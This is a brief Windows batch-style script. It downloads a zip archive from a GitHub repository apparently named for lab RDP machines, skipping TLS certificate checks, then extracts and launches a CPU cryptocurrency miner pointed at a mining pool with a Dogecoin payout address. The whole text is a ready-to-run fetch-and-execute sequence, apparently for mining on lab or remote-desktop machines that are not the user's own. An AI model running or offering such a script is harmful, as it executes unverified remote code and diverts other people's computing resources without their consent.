cd C:\Users\Administrator\Desktop
curl -LJOk https://raw.githubusercontent.com/mrX04/lab2rdp/master/ekemlig.zip
7z.exe x ekemlig.zip
cd C:\Users\Administrator\Desktop\Cpuminer-opt-cpu-pool-win64
start cpuminer.exe -a yescrypt -o stratum+tcp://yescrypt.eu.mine.zpool.ca:6233 -u D9XUkoTzBzJ3x7ZveiSqequCDJTVACoBLv -p c=DOGE
